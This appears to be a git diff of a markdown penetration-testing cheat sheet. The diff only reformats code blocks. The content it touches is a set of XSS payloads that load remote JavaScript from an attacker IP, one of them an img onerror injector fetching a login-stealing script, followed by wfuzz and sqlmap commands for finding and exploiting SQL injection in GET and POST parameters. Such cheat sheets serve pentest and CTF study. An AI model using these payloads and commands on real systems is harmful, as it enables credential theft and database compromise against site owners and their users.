@@ -114,31 +114,20 @@ fetch("login").then(res => res.text().then(data => {
 
  - External payload: `<script src="http://10.10.13.37/xss.js"></script>`
 
- - Insert script from external: 
- ```shell
- <img src='x' onerror='const script = document.createElement("script"); script.src="http://10.10.13.37/xss-login.js";document.head.append(script);'>
- ```
+ - Insert script from external: `<img src='x' onerror='const script = document.createElement("script"); script.src="http://10.10.13.37/xss-login.js";document.head.append(script);'>`
 
 
 ## SQL Injection (SQLi)
 
 ### Fuzzing GET parameter
-```shell
-wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"
-```
+`wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"`
 
 ### Fuzzing POST parameter
-```shell
-wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"
-```
+`wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"`
 
 ### sqlmap GET parameter
-```shell
-sqlmap -u "$URL/index.php?id=1"
-```
+`sqlmap -u "$URL/index.php?id=1"`
 
 ### sqlmap POST parameter
 Copy POST request from Burp Suite into `post.req` file
-```shell
-sqlmap -r post.req -p parameter
-```
+`sqlmap -r post.req -p parameter`
